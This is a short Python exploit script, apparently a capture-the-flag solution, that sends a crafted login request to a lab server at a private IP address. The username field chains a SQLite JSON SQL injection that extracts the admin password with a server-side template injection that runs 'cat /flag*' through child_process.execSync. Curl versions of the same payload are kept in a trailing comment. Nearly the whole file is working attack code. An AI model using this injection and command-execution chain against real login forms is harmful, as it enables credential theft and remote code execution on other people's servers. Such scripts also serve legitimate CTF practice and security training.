import requests
import json


def main():
    url = "http://10.113.184.121:10081/login"
    # url = "http://127.0.0.1:3000/login"
    data = {
        "username": "\", '$.admin.password')->>'$[1]' as password from db -- ; <%= global.process.mainModule.require('child_process').execSync('cat /flag*').toString() %>;",
        # "password": "FLAG{flag-1}",
        "password": "FLAG{sqlite_js0n_inject!on}",
    }
    # data = json.dumps(data)
    r = requests.post(url, data=data)
    print(r.request.headers)
    print(r.request.body)
    print(json.dumps(data, indent=4, sort_keys=True))
    print(r.text)


if __name__ == "__main__":
    main()

"""
curl -v http://localhost:3000/login -d username:'", \'$.admin.password\')->>\'$[1]\' as password from db --'&password='FLAG{flag-1}'
curl -X POST http://10.113.184.121:10081/login --data username='", \'$.admin.password\')->>\'$[1]\' as password from db -- <%= global.process.mainModule.require(\'child_process\').execSync(\'cat /flag*\').toString() %>' --data password='FLAG{sqlite_js0n_inject!on}'
"""
